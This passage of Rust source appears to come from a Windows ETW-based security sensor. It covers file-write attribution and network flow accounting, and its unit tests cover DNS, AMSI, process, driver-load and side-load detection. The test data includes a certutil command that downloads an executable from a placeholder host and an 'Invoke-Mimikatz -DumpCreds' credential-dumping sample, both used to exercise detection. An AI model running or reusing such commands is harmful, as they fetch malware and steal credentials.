        (completed >= at && completed - at <= DNS_HINT_TTL_TICKS).then_some(server)
    }
}

/// Process that issued a file create/overwrite or write (Kernel-File).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct FileTouch {
    pub pid: i32,
    pub path: String,
}

const FILE_OBJECTS_MAX: usize = 8192;
const TOUCH_INTERVAL_TICKS: i64 = 10_000_000;
/// `FILE_DIRECTORY_FILE` in `CreateOptions`.
const FILE_DIRECTORY_FILE: u64 = 0x1;

/// FileObject → path for open handles, filled by Create and read by Write
/// (a Write event carries no name). Bounded; cleared when full, so at worst
/// writes to files opened before the clear are not attributed.
#[derive(Default)]
pub struct FileObjects {
    /// FileObject → (path, FILETIME of the last touch reported).
    paths: HashMap<u64, (String, Option<i64>)>,
    /// Times the table was cleared at its bound (attribution lost, no event).
    pub overflows: u64,
}

impl FileObjects {
    /// Kernel-File Create (12) / Cleanup (13) / Close (14) / Write (16) → the
    /// touch it proves. A create counts only when its disposition creates or
    /// truncates (`FILE_SUPERSEDE`, `FILE_CREATE`, `FILE_OVERWRITE`,
    /// `FILE_OVERWRITE_IF`); opening an existing file proves nothing.
    /// `header_pid` is the issuing process of the operation.
    pub fn observe(&mut self, rec: &EtwRecord, devices: &DeviceMap) -> Option<FileTouch> {
        if rec.provider != KERNEL_FILE {
            return None;
        }
        let object = rec.int(&["FileObject"])?;
        let pid = i32::try_from(rec.header_pid).ok().filter(|p| *p > 0)?;
        match rec.id {
            12 => {
                let name = rec.str(&["FileName"]).filter(|n| !n.is_empty())?;
                let options = rec.int(&["CreateOptions"]).unwrap_or(0);
                if options & FILE_DIRECTORY_FILE != 0 {
                    return None;
                }
                let path = device_to_dos(&name, devices);
                if self.paths.len() >= FILE_OBJECTS_MAX {
                    self.paths.clear();
                    self.overflows += 1;
                }
                let creates = matches!((options >> 24) & 0xff, 0 | 2 | 4 | 5);
                self.paths
                    .insert(object, (path.clone(), creates.then_some(rec.timestamp)));
                creates.then_some(FileTouch { pid, path })
            }
            13 | 14 => {
                self.paths.remove(&object);
                None
            }
            // One report per open file per second: a bulk write is one
            // attribution, not thousands of identity look-ups.
            16 => {
                let (path, last) = self.paths.get_mut(&object)?;
                if last.is_some_and(|t| rec.timestamp.saturating_sub(t) < TOUCH_INTERVAL_TICKS) {
                    return None;
                }
                *last = Some(rec.timestamp);
                Some(FileTouch {
                    pid,
                    path: path.clone(),
                })
            }
            _ => None,
        }
    }
}

/// Network flows tracked for byte accounting.
const FLOWS_MAX: usize = 8192;

#[derive(Debug, Clone, PartialEq, Eq, Hash)]
struct FlowKey {
    pid: i32,
    /// The two endpoints in a fixed order: the provider does not use one
    /// orientation for every event of an accepted connection.
    ends: ((String, u16), (String, u16)),
}

struct Flow {
    data: NetworkConnectionData,
    first_ts: i64,
    sent: u64,
    recv: u64,
}

/// Per-connection byte totals from Kernel-Network send/receive events, emitted
/// as one `closed` record when the connection ends. Bounded by [`FLOWS_MAX`];
/// the oldest flow is flushed as an `open` snapshot instead of dropped.
/// Only TCP flows whose connect/accept was observed are tracked, so a
/// connection that predates the session reports no bytes rather than wrong
/// ones.
#[derive(Default)]
pub struct NetFlows {
    flows: HashMap<FlowKey, Flow>,
    order: VecDeque<FlowKey>,
    /// Traffic for connections never seen opening (no totals emitted).
    pub untracked: u64,
}

fn flow_key(pid: i32, a: (String, u16), b: (String, u16)) -> FlowKey {
    let ends = if a <= b { (a, b) } else { (b, a) };
    FlowKey { pid, ends }
}

fn record_key(rec: &EtwRecord) -> Option<FlowKey> {
    let pid = i32::try_from(rec.int(&["PID"])?).ok()?;
    Some(flow_key(
        pid,
        (address(rec, "saddr")?, port(rec, "sport")?),
        (address(rec, "daddr")?, port(rec, "dport")?),
    ))
}

impl NetFlows {
    /// Start tracking a flow from its connect/accept record (already mapped).
    /// Returns the snapshot of a flow evicted to make room, if any.
    pub fn open(&mut self, data: &NetworkConnectionData, ts: i64) -> Option<NetworkConnectionData> {
        let pid = data.pid?;
        let key = flow_key(
            pid,
            (data.src_addr.clone(), data.src_port),
            (data.dst_addr.clone(), data.dst_port),
        );
        let flow = Flow {
            data: data.clone(),
            first_ts: ts,
            sent: 0,
            recv: 0,
        };
        let mut evicted = None;
        if !self.flows.contains_key(&key) {
            while self.flows.len() >= FLOWS_MAX {
                let Some(old) = self.order.pop_front() else {
                    break;
                };
                if let Some(f) = self.flows.remove(&old) {
                    evicted = Some(f.finish("open", ts));
                }
            }
            self.order.push_back(key.clone());
        }
        self.flows.insert(key, flow);
        evicted
    }

    /// Fold a Kernel-Network send (10/26), receive (11/27) or disconnect
    /// (13/29) record in. Returns the `closed` record on disconnect.
    pub fn observe(&mut self, rec: &EtwRecord) -> Option<NetworkConnectionData> {
        if rec.provider != KERNEL_NETWORK {
            return None;
        }
        let (sending, receiving, closing) = match rec.id {
            10 | 26 => (true, false, false),
            11 | 27 => (false, true, false),
            13 | 29 => (false, false, true),
            _ => return None,
        };
        let key = record_key(rec)?;
        let Some(flow) = self.flows.get_mut(&key) else {
            self.untracked += 1;
            return None;
        };
        let size = rec.int(&["size"]).unwrap_or(0);
        if sending {
            flow.sent = flow.sent.saturating_add(size);
        } else if receiving {
            flow.recv = flow.recv.saturating_add(size);
        }
        if !closing {
            return None;
        }
        let flow = self.flows.remove(&key)?;
        self.order.retain(|k| k != &key);
        Some(flow.finish("closed", rec.timestamp))
    }
}

impl Flow {
    fn finish(self, state: &str, ts: i64) -> NetworkConnectionData {
        let mut data = self.data;
        data.state = state.into();
        data.bytes_sent = Some(self.sent);
        data.bytes_recv = Some(self.recv);
        if ts >= self.first_ts && self.first_ts > 0 {
            data.duration_ms = Some(((ts - self.first_ts) / 10_000) as u64);
        }
        data
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn side_load_candidates_are_protected_process_plus_writable_dll() {
        let sys = r"C:\Windows\System32\svchost.exe";
        assert!(is_side_load_candidate(
            sys,
            r"C:\Users\a\AppData\Roaming\x\version.dll"
        ));
        assert!(is_side_load_candidate(sys, r"C:\Users\Public\wlbsctrl.DLL"));
        assert!(is_side_load_candidate(
            r"C:\Program Files\App\app.exe",
            r"C:\ProgramData\evil\a.dll"
        ));
        // a protected location for the DLL, or not a DLL, is ordinary
        assert!(!is_side_load_candidate(
            sys,
            r"C:\Windows\System32\kernel32.dll"
        ));
        assert!(!is_side_load_candidate(
            sys,
            r"C:\Users\a\AppData\Roaming\x\data.bin"
        ));
        // per-user apps live and load from AppData
        assert!(!is_side_load_candidate(
            r"C:\Users\a\AppData\Local\app\app.exe",
            r"C:\Users\a\AppData\Local\app\lib.dll"
        ));
        // known per-user sync clients' shell extensions, and Microsoft's ProgramData
        assert!(!is_side_load_candidate(
            r"C:\Windows\System32\explorer.exe",
            r"C:\Users\a\AppData\Local\Microsoft\OneDrive\24.1\FileSyncShell64.dll"
        ));
        assert!(!is_side_load_candidate(
            sys,
            r"C:\ProgramData\Microsoft\Windows Defender\Platform\x.dll"
        ));
    }

    fn rec(provider: u128, id: u16, props: &[(&str, EtwValue)]) -> EtwRecord {
        EtwRecord {
            provider,
            id,
            header_pid: 4,
            timestamp: 0,
            props: props
                .iter()
                .map(|(k, v)| (k.to_string(), v.clone()))
                .collect(),
            captured: None,
        }
    }
    fn int(v: u64, width: usize) -> EtwValue {
        EtwValue::Int(v, v.to_le_bytes()[..width].to_vec())
    }
    fn s(v: &str) -> EtwValue {
        EtwValue::Str(v.into())
    }

    fn devices() -> DeviceMap {
        vec![
            ("\\Device\\HarddiskVolume3".into(), "C:".into()),
            ("\\Device\\HarddiskVolume10".into(), "D:".into()),
        ]
    }

    #[test]
    fn reused_pid_and_old_records_are_not_enriched() {
        assert!(same_process_generation(Some(100), Some(100), 120));
        assert!(!same_process_generation(Some(100), Some(200), 120));
        assert!(!same_process_generation(Some(100), Some(100), 90));
        assert!(!same_process_generation(None, Some(100), 120));
        assert!(!same_process_generation(Some(100), None, 120));
    }

    #[test]
    fn event_filetime_keeps_sensor_time_and_unicode_device_paths_do_not_panic() {
        assert_eq!(
            filetime_timestamp(116_444_736_000_000_000)
                .unwrap()
                .timestamp(),
            0
        );
        assert!(filetime_timestamp(0).is_none());
        assert_eq!(
            device_to_dos("aéabc", &vec![("ab".into(), "C:".into())]),
            "aéabc"
        );
    }

    #[test]
    fn kernel_space_image_loads_are_driver_loads() {
        let d = devices();
        let base = |b: u64| int(b, 8);
        let r = rec(
            KERNEL_PROCESS,
            5,
            &[
                ("ProcessID", int(4, 4)),
                (
                    "ImageName",
                    s("\\Device\\HarddiskVolume3\\Windows\\System32\\drivers\\RTCore64.sys"),
                ),
                ("ImageBase", base(0xFFFF_F801_2345_0000)),
                ("ImageSize", int(0x9000, 4)),
            ],
        );
        let drv = driver_load(&r, &d, "C:\\Windows").unwrap();
        assert_eq!(drv.path, "C:\\Windows\\System32\\drivers\\RTCore64.sys");
        assert_eq!(drv.name, "RTCore64.sys");
        assert_eq!(drv.image_size, Some(0x9000));
        // The pseudo-PID does not matter, the base does.
        let r = rec(
            KERNEL_PROCESS,
            5,
            &[
                ("ProcessID", int(0, 4)),
                ("ImageName", s("\\SystemRoot\\system32\\drivers\\x.sys")),
                ("ImageBase", base(0xFFFF_8000_0000_0000)),
            ],
        );
        assert_eq!(
            driver_load(&r, &d, "C:\\Windows").unwrap().path,
            "C:\\Windows\\system32\\drivers\\x.sys"
        );
    }

    #[test]
    fn user_mode_images_are_not_driver_loads() {
        let d = devices();
        let r = rec(
            KERNEL_PROCESS,
            5,
            &[
                ("ProcessID", int(4, 4)),
                ("ImageName", s("\\Device\\HarddiskVolume3\\a.sys")),
                ("ImageBase", int(0x7FF6_0000_0000, 8)),
            ],
        );
        // A .sys name in a user-mode mapping must not pass on the name alone.
        assert!(driver_load(&r, &d, "C:\\Windows").is_none());
        // Wrong provider / event id.
        let mut r2 = r.clone();
        r2.id = 1;
        assert!(driver_load(&r2, &d, "").is_none());
        // Fallback only when ImageBase is absent: PID 4 and .sys.
        let r3 = rec(
            KERNEL_PROCESS,
            5,
            &[
                ("ProcessID", int(4, 4)),
                ("ImageName", s("\\Device\\HarddiskVolume3\\b.SYS")),
            ],
        );
        assert!(driver_load(&r3, &d, "").is_some());
        let r4 = rec(
            KERNEL_PROCESS,
            5,
            &[
                ("ProcessID", int(900, 4)),
                ("ImageName", s("\\Device\\HarddiskVolume3\\b.dll")),
            ],
        );
        assert!(driver_load(&r4, &d, "").is_none());
    }

    #[test]
    fn rate_gate_bursts_then_refills() {
        let mut g = RateGate::new(2, 3);
        assert!(g.allow(0) && g.allow(0) && g.allow(0));
        assert!(!g.allow(0), "burst exhausted");
        assert!(!g.allow(100), "0.2 tokens only");
        assert!(g.allow(600), "one token after 0.5 s at 2/s");
        assert!(!g.allow(600));
        // A clock that goes backwards neither panics nor mints tokens.
        assert!(!g.allow(10));
        // Never above the burst.
        for _ in 0..3 {
            assert!(g.allow(60_000));
        }
        assert!(!g.allow(60_000));
    }

    fn utf16le(s: &str) -> Vec<u8> {
        s.encode_utf16().flat_map(|c| c.to_le_bytes()).collect()
    }

    #[test]
    fn pipe_prefilter_finds_the_device_in_a_raw_payload() {
        let mut payload = vec![0u8; 32];
        payload.extend(utf16le("\\Device\\NamedPipe\\msagent_81"));
        assert!(payload_mentions_pipe(&payload));
        let mut lower = vec![1u8; 7];
        lower.extend(utf16le("\\device\\namedpipe\\x"));
        assert!(payload_mentions_pipe(&lower));
        // An ordinary file, a short buffer, and a byte-shifted (odd) match.
        let mut file = vec![0u8; 32];
        file.extend(utf16le("\\Device\\HarddiskVolume3\\a.txt"));
        assert!(!payload_mentions_pipe(&file));
        assert!(!payload_mentions_pipe(&[0u8; 4]));
        assert!(!payload_mentions_pipe(b"\\NamedPipe\\ascii-not-utf16"));
    }

    #[test]
    fn pipe_create_maps_to_the_win32_pipe_path() {
        let r = rec(
            KERNEL_FILE,
            12,
            &[("FileName", s("\\Device\\NamedPipe\\MSSE-1234-server"))],
        );
        let mut r = r;
        r.header_pid = 4242;
        assert_eq!(
            pipe_create(&r),
            Some((4242, "\\\\.\\pipe\\MSSE-1234-server".to_string()))
        );
        // Not a pipe, the pipe root, another event id, another provider.
        let other = rec(
            KERNEL_FILE,
            12,
            &[("FileName", s("\\Device\\HarddiskVolume3\\x"))],
        );
        assert!(pipe_create(&other).is_none());
        let root = rec(KERNEL_FILE, 12, &[("FileName", s("\\Device\\NamedPipe\\"))]);
        assert!(pipe_create(&root).is_none());
        let mut wrong_id = r.clone();
        wrong_id.id = 14;
        assert!(pipe_create(&wrong_id).is_none());
        let mut wrong_provider = r.clone();
        wrong_provider.provider = DNS_CLIENT;
        assert!(pipe_create(&wrong_provider).is_none());
        // Hostile name length is bounded.
        let long = format!("\\Device\\NamedPipe\\{}", "a".repeat(5000));
        let rl = rec(KERNEL_FILE, 12, &[("FileName", s(&long))]);
        let (_, path) = pipe_create(&rl).unwrap();
        assert_eq!(path.chars().count(), "\\\\.\\pipe\\".len() + 256);
    }

    #[test]
    fn recent_set_reports_repeats_once_per_window_and_stays_bounded() {
        let mut set = RecentSet::new(1000, 2);
        assert!(set.first_seen("a", 0));
        assert!(!set.first_seen("a", 999));
        assert!(set.first_seen("a", 1000), "window elapsed");
        assert!(set.first_seen("b", 1000));
        // Full: a new key clears instead of growing.
        assert!(set.first_seen("c", 1001));
        assert!(set.seen.len() <= 2);
    }

    #[test]
    fn loss_guard_trips_once_past_the_limit() {
        let mut g = LossGuard::new(100, 50);
        assert!(!g.observe(100));
        assert!(!g.observe(150), "exactly at the limit is tolerated");
        assert!(g.observe(151));
        assert!(!g.observe(10_000), "only once");
        assert!(
            !LossGuard::new(500, 10).observe(400),
            "counter reset is not a trip"
        );
    }

    fn amsi_rec(result: u64, content: Option<Vec<u8>>, size: u64) -> EtwRecord {
        let mut props = vec![
            (
                "appname",
                s("PowerShell_C:\\Windows\\System32\\powershell.exe_10.0"),
            ),
            ("contentname", s("C:\\Users\\a\\x.ps1")),
            ("scanResult", int(result, 4)),
            ("scanStatus", int(0, 1)),
            ("contentsize", int(size, 4)),
        ];
        if let Some(c) = content {
            props.push(("content", EtwValue::Bytes(c)));
        }
        let mut r = rec(AMSI, 1101, &props);
        r.header_pid = 777;
        r
    }

    #[test]
    fn amsi_text_decodes_utf16_utf8_and_refuses_binary() {
        assert_eq!(
            decode_amsi_text(&utf16le("\u{feff}iex 'a'")).as_deref(),
            Some("iex 'a'")
        );
        assert_eq!(decode_amsi_text(b"echo hi").as_deref(), Some("echo hi"));
        assert!(decode_amsi_text(b"MZ\x90\x00\x03\x00").is_none());
        assert!(decode_amsi_text(&[0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08]).is_none());
        assert!(decode_amsi_text(b"").is_none());
    }

    #[test]
    fn amsi_content_is_only_captured_with_the_opt_in() {
        let script = utf16le("Invoke-Mimikatz -DumpCreds");
        let r = amsi_rec(1, Some(script.clone()), script.len() as u64);
        // Off: a clean scan produces nothing at all.
        assert!(amsi_scan(&r, false).is_none());
        // Off, but the scan was flagged: metadata only, never the text.
        let flagged = amsi_rec(32768, Some(script.clone()), script.len() as u64);
        let off = amsi_scan(&flagged, false).unwrap();
        assert!(!off.data.message.contains("Mimikatz"));
        assert!(off.content_sha256.is_none());
        assert_eq!(off.data.fields["content_omitted"], "capture_disabled");
        assert_eq!(off.data.fields["content_captured"], false);
        assert_eq!(off.data.fields["scan_verdict"], "detected");
        assert!(!serde_json::to_string(&off.data)
            .unwrap()
            .contains("Mimikatz"));
        // On: the text and its hash travel.
        let on = amsi_scan(&r, true).unwrap();
        assert_eq!(on.data.message, "Invoke-Mimikatz -DumpCreds");
        assert_eq!(on.data.fields["content_captured"], true);
        assert_eq!(on.data.fields["content_truncated"], false);
        assert!(on.content_sha256.unwrap().starts_with("sha256:"));
        assert_eq!(on.data.pid, Some(777));
        assert_eq!(on.data.source_type, "windows_etw");
        assert_eq!(on.data.fields["EventID"], 1101);
    }

    #[test]
    fn amsi_content_is_truncated_with_markers_and_binary_is_omitted() {
        let big = "A".repeat(AMSI_MAX_CONTENT_BYTES + 100);
        let r = amsi_rec(0, Some(big.clone().into_bytes()), big.len() as u64);
        let scan = amsi_scan(&r, true).unwrap();
        assert_eq!(scan.data.message.len(), AMSI_MAX_CONTENT_BYTES);
        assert_eq!(scan.data.fields["content_truncated"], true);
        assert_eq!(
            scan.data.truncated_fields.as_ref().unwrap()["message"].original_length,
            big.len()
        );
        let bin = amsi_rec(0, Some(b"MZ\x90\x00\x03".to_vec()), 5);
        let scan = amsi_scan(&bin, true).unwrap();
        assert_eq!(scan.data.fields["content_omitted"], "binary");
        assert!(scan.data.message.starts_with("AMSI scan clean"));
        // The reader refused a value above its cap: say so, do not guess.
        let huge = amsi_rec(0, None, 1_000_000);
        assert_eq!(
            amsi_scan(&huge, true).unwrap().data.fields["content_omitted"],
            "oversize"
        );
        // Empty scans carry nothing and are skipped; wrong event ids too.
        assert!(amsi_scan(&amsi_rec(0, None, 0), true).is_none());
        let mut other = r.clone();
        other.id = 1102;
        assert!(amsi_scan(&other, true).is_none());
    }

    #[test]
    fn device_paths_map_to_drives() {
        let d = devices();
        assert_eq!(
            device_to_dos("\\Device\\HarddiskVolume3\\Windows\\System32\\cmd.exe", &d),
            "C:\\Windows\\System32\\cmd.exe"
        );
        // Volume3 must not match Volume30 / the Volume10 prefix of another.
        assert_eq!(
            device_to_dos("\\Device\\HarddiskVolume10\\x.exe", &d),
            "D:\\x.exe"
        );
        assert_eq!(
            device_to_dos("\\Device\\HarddiskVolume30\\x.exe", &d),
            "\\Device\\HarddiskVolume30\\x.exe"
        );
        assert_eq!(device_to_dos("\\??\\C:\\x.exe", &d), "C:\\x.exe");
        assert_eq!(device_to_dos("C:\\x.exe", &d), "C:\\x.exe");
    }

    #[test]
    fn process_start_uses_enrichment_and_survives_without_it() {
        let r = rec(
            KERNEL_PROCESS,
            1,
            &[
                ("ProcessID", int(4242, 4)),
                ("ParentProcessID", int(1000, 4)),
                ("CreateTime", int(133_000_000_000_000_000, 8)),
                (
                    "ImageName",
                    s("\\Device\\HarddiskVolume3\\Windows\\System32\\certutil.exe"),
                ),
            ],
        );
        let p = process_start(
            &r,
            &devices(),
            ProcessEnrichment {
                cmdline: Some("certutil -urlcache -f http://x/a.exe a.exe".into()),
                username: Some("CORP\\anna".into()),
                ..Default::default()
            },
        )
        .unwrap();
        assert_eq!((p.pid, p.ppid), (4242, 1000));
        assert_eq!(p.exe, "C:\\Windows\\System32\\certutil.exe");
        assert_eq!(p.name, "certutil.exe");
        assert_eq!(p.process_start_time, Some(133_000_000_000_000_000));
        assert_eq!(p.username, "CORP\\anna");

        // A process gone before enrichment still yields an event.
        let p = process_start(&r, &devices(), ProcessEnrichment::default()).unwrap();
        assert!(p.cmdline.is_empty());
        assert_eq!(p.username, "unknown");

        // An image that could not be hashed is recorded, not silently omitted.
        let p = process_start(
            &r,
            &devices(),
            ProcessEnrichment {
                cmdline: Some("x".into()),
                exe_sha256_error: Some(crate::telemetry::EnrichmentError::Unsupported),
                ..Default::default()
            },
        )
        .unwrap();
        assert!(p.exe_sha256.is_none());
        assert_eq!(
            p.enrichment.enrichment_errors["exe_sha256"],
            crate::telemetry::EnrichmentError::Unsupported
        );

        // Aliases of older builds.
        let old = rec(
            KERNEL_PROCESS,
            1,
            &[
                ("ProcessId", int(7, 4)),
                ("ParentId", int(6, 4)),
                ("ImageFileName", s("C:\\a.exe")),
            ],
        );
        assert_eq!(
            process_start(&old, &devices(), ProcessEnrichment::default())
                .unwrap()
                .ppid,
            6
        );
        assert!(process_start(
            &rec(KERNEL_NETWORK, 1, &[]),
            &devices(),
            ProcessEnrichment::default()
        )
        .is_none());
    }

    #[test]
    fn process_stop_and_image_load() {
        let stop = rec(
            KERNEL_PROCESS,
            2,
            &[
                ("ProcessID", int(9, 4)),
                ("ImageName", s("\\Device\\HarddiskVolume3\\x\\y.exe")),
            ],
        );
        assert_eq!(process_stop(&stop, &devices()).unwrap().name, "y.exe");
        let load = rec(
            KERNEL_PROCESS,
            5,
            &[
                ("ProcessID", int(9, 4)),
                (
                    "ImageName",
                    s("\\Device\\HarddiskVolume3\\Users\\a\\AppData\\x.dll"),
                ),
            ],
        );
        assert_eq!(
            image_load(&load, &devices()).unwrap(),
            (9, "C:\\Users\\a\\AppData\\x.dll".to_string())
        );
    }

    #[test]
    fn network_connect_decodes_network_order() {
        // 10.20.0.5:443 ← 10.20.0.50:51000, as the provider stores them.
        let r = rec(
            KERNEL_NETWORK,
            12,
            &[
                ("PID", int(1234, 4)),
                ("daddr", EtwValue::Int(0, vec![10, 20, 0, 5])),
                ("saddr", EtwValue::Int(0, vec![10, 20, 0, 50])),
                ("dport", EtwValue::Int(0, 443u16.to_be_bytes().to_vec())),
                ("sport", EtwValue::Int(0, 51000u16.to_be_bytes().to_vec())),
            ],
        );
        let c = network_connection(&r, Some("x.exe".into())).unwrap();
        assert_eq!(
            (c.dst_addr.as_str(), c.dst_port, c.src_port),
            ("10.20.0.5", 443, 51000)
        );
        assert_eq!(c.pid, Some(1234));
        assert_eq!(c.state, "established");

        let mut accept = r.clone();
        accept.id = 15;
        let a = network_connection(&accept, None).unwrap();
        assert_eq!(
            (a.dst_addr.as_str(), a.dst_port, a.state.as_str()),
            ("10.20.0.50", 51000, "accepted")
        );

        let mut v6 = r.clone();
        v6.id = 28;
        v6.props.insert(
            "daddr".into(),
            EtwValue::Bytes("2001:db8::1".parse::<Ipv6Addr>().unwrap().octets().to_vec()),
        );
        v6.props.insert(
            "saddr".into(),
            EtwValue::Bytes(Ipv6Addr::LOCALHOST.octets().to_vec()),
        );
        let c6 = network_connection(&v6, None).unwrap();
        assert_eq!(
            (c6.protocol.as_str(), c6.dst_addr.as_str()),
            ("tcp6", "2001:db8::1")
        );

        let mut other = r.clone();
        other.id = 10; // data sent: not a connection start
        assert!(network_connection(&other, None).is_none());
    }

    #[test]
    fn dns_query_parses_results() {
        let r = rec(
            DNS_CLIENT,
            3008,
            &[
                ("QueryName", s("login.microsoftonline.com.")),
                ("QueryType", int(1, 2)),
                ("QueryStatus", int(0, 4)),
                (
                    "QueryResults",
                    s("type:  5 login.mso.msidentity.com;20.190.159.0;::ffff:20.190.159.0;"),
                ),
            ],
        );
        let (pid, d) = dns_query(&r).unwrap();
        assert_eq!(pid, 4);
        assert_eq!(d.qname, "login.microsoftonline.com");
        assert_eq!(d.qtype, "A");
        assert_eq!(d.rcode, "NOERROR");
        assert_eq!(d.cnames, vec!["login.mso.msidentity.com".to_string()]);
        assert_eq!(d.resolved_ips, vec!["20.190.159.0".to_string()]);

        let nx = rec(
            DNS_CLIENT,
            3008,
            &[
                ("QueryName", s("nope.corp")),
                ("QueryType", int(28, 2)),
                ("QueryStatus", int(9003, 4)),
            ],
        );
        let (_, d) = dns_query(&nx).unwrap();
        assert_eq!((d.qtype.as_str(), d.rcode.as_str()), ("AAAA", "NXDOMAIN"));
        assert!(dns_query(&rec(DNS_CLIENT, 3006, &[("QueryName", s("x"))])).is_none());
    }

    #[test]
    fn dns_authority_records_are_not_cnames() {
        // Negative answer: Windows lists the zone's SOA (type 6), whose first
        // field is the primary nameserver. That is not an alias.
        let r = rec(
            DNS_CLIENT,
            3008,
            &[
                ("QueryName", s("nope.example.com")),
                ("QueryType", int(1, 2)),
                ("QueryStatus", int(9003, 4)),
                (
                    "QueryResults",
                    s("type:  6 ns1.example.com hostmaster.example.com 1 900 300 604800 60;"),
                ),
            ],
        );
        let (_, d) = dns_query(&r).unwrap();
        assert_eq!(d.rcode, "NXDOMAIN");
        assert!(d.cnames.is_empty(), "{:?}", d.cnames);
        assert!(d.resolved_ips.is_empty());

        let (ips, cnames) = parse_query_results(
            "type:  5 a.example;type:  2 ns.example;1.2.3.4;1.2.3.4;::ffff:1.2.3.4;2001:db8::1;",
        );
        assert_eq!(cnames, vec!["a.example".to_string()]);
        assert_eq!(ips, vec!["1.2.3.4".to_string(), "2001:db8::1".to_string()]);
    }

    #[test]
    fn rcode_maps_dns_statuses_and_never_leaks_win32_numbers() {
        for (status, want) in [
            (0, "NOERROR"),
            (9001, "FORMERR"),
            (9002, "SERVFAIL"),
            (9003, "NXDOMAIN"),
            (9004, "NOTIMP"),
            (9005, "REFUSED"),
            (9009, "NOTAUTH"),
            (9501, "NODATA"),
            (9701, "NODATA"),
            (1460, "TIMEOUT"),
            (10060, "TIMEOUT"),
            (87, "UNKNOWN"),
            (123_456, "UNKNOWN"),
        ] {
            assert_eq!(rcode(status), want, "status {status}");
        }
    }

    #[test]
    fn process_start_prefers_payload_then_early_capture_and_caps_length() {
        let base = [
            ("ProcessID", int(4242, 4)),
            ("CreateTime", int(133_000_000_000_000_000, 8)),
            ("ImageName", s("C:\\Windows\\System32\\cmd.exe")),
        ];
        // The kernel payload beats a (possibly stale) captured value.
        let mut props = base.to_vec();
        props.push(("CommandLine", s("cmd /c echo payload")));
        let p = process_start(
            &rec(KERNEL_PROCESS, 1, &props),
            &devices(),
            ProcessEnrichment {
                cmdline: Some("cmd /c echo captured".into()),
                username: Some("CORP\\anna".into()),
                ..Default::default()
            },
        )
        .unwrap();
        assert_eq!(p.cmdline, "cmd /c echo payload");
        assert!(p.enrichment.enrichment_errors.is_empty());

        // Without a payload the early capture is used.
        let r = rec(KERNEL_PROCESS, 1, &base);
        let p = process_start(
            &r,
            &devices(),
            ProcessEnrichment {
                cmdline: Some("cmd /c echo captured".into()),
                username: Some("CORP\\anna".into()),
                ..Default::default()
            },
        )
        .unwrap();
        assert_eq!(p.cmdline, "cmd /c echo captured");

        // Nothing at all: partial, both fields reported.
        let p = process_start(&r, &devices(), ProcessEnrichment::default()).unwrap();
        assert!(p.cmdline.is_empty() && p.username == "unknown");
        assert!(p.enrichment.enrichment_errors.contains_key("cmdline"));
        assert!(p.enrichment.enrichment_errors.contains_key("username"));

        // Oversized command lines are capped and marked.
        let huge = "x".repeat(crate::telemetry::limits::MAX_CMDLINE_BYTES + 10);
        let p = process_start(
            &r,
            &devices(),
            ProcessEnrichment {
                cmdline: Some(huge),
                ..Default::default()
            },
        )
        .unwrap();
        assert_eq!(p.cmdline.len(), crate::telemetry::limits::MAX_CMDLINE_BYTES);
        assert!(p.enrichment.truncated_fields.contains_key("cmdline"));
    }

    #[test]
    fn early_capture_wins_and_late_lookup_fills_gaps() {
        let early = ProcessEnrichment {
            cmdline: Some("reg add HKCU\\x".into()),
            username: Some(String::new()), // failed read counts as missing
            ..Default::default()
        };
        let late = ProcessEnrichment {
            exe: Some("C:\\Windows\\System32\\reg.exe".into()),
            cmdline: Some("stale".into()),
            username: Some("CORP\\anna".into()),
            exe_sha256: Some("sha256:ab".into()),
            ..Default::default()
        };
        let m = early.prefer_over(late);
        assert_eq!(m.cmdline.as_deref(), Some("reg add HKCU\\x"));
        assert_eq!(m.username.as_deref(), Some("CORP\\anna"));
        assert_eq!(m.exe.as_deref(), Some("C:\\Windows\\System32\\reg.exe"));
        assert_eq!(m.exe_sha256.as_deref(), Some("sha256:ab"));
        let none = ProcessEnrichment::default().prefer_over(ProcessEnrichment::default());
        assert!(none.cmdline.is_none() && none.username.is_none());
    }

    fn file_rec(id: u16, pid: u32, ts: i64, props: &[(&str, EtwValue)]) -> EtwRecord {
        let mut r = rec(KERNEL_FILE, id, props);
        r.header_pid = pid;
        r.timestamp = ts;
        r
    }

    #[test]
    fn file_create_and_write_name_the_issuing_process() {
        let mut t = FileObjects::default();
        let d = devices();
        let name = s("\\Device\\HarddiskVolume3\\Users\\a\\x.txt");
        // FILE_OPEN (1): proves nothing yet, but remembers the object.
        let open = file_rec(
            12,
            900,
            0,
            &[
                ("FileObject", int(7, 8)),
                ("FileName", name.clone()),
                ("CreateOptions", int(1 << 24, 4)),
            ],
        );
        assert!(t.observe(&open, &d).is_none());
        let w = file_rec(16, 900, 50_000_000, &[("FileObject", int(7, 8))]);
        let touch = t.observe(&w, &d).unwrap();
        assert_eq!(
            (touch.pid, touch.path.as_str()),
            (900, "C:\\Users\\a\\x.txt")
        );
        // Bulk writes inside a second are one attribution.
        let w2 = file_rec(16, 900, 50_000_100, &[("FileObject", int(7, 8))]);
        assert!(t.observe(&w2, &d).is_none());
        let w3 = file_rec(16, 901, 70_000_000, &[("FileObject", int(7, 8))]);
        assert_eq!(t.observe(&w3, &d).unwrap().pid, 901);
        // Close forgets the object; an unknown object is never attributed.
        t.observe(&file_rec(14, 900, 0, &[("FileObject", int(7, 8))]), &d);
        assert!(t
            .observe(
                &file_rec(16, 900, 99_000_000, &[("FileObject", int(7, 8))]),
                &d
            )
            .is_none());
    }

    #[test]
    fn file_create_dispositions_and_directories() {
        let d = devices();
        let mut t = FileObjects::default();
        let mk = |obj: u64, disp: u64, extra: u64| {
            file_rec(
                12,
                5,
                1,
                &[
                    ("FileObject", int(obj, 8)),
                    ("FileName", s("C:\\a\\f")),
                    ("CreateOptions", int((disp << 24) | extra, 4)),
                ],
            )
        };
        assert!(t.observe(&mk(1, 2, 0), &d).is_some(), "FILE_CREATE");
        assert!(t.observe(&mk(2, 5, 0), &d).is_some(), "FILE_OVERWRITE_IF");
        assert!(
            t.observe(&mk(3, 3, 0), &d).is_none(),
            "FILE_OPEN_IF may only open"
        );
        assert!(
            t.observe(&mk(4, 2, FILE_DIRECTORY_FILE), &d).is_none(),
            "directory"
        );
        let mut other = mk(5, 2, 0);
        other.provider = KERNEL_NETWORK;
        assert!(t.observe(&other, &d).is_none());
        let mut nopid = mk(6, 2, 0);
        nopid.header_pid = 0;
        assert!(t.observe(&nopid, &d).is_none());
    }

    #[test]
    fn file_object_table_is_bounded() {
        let d = devices();
        let mut t = FileObjects::default();
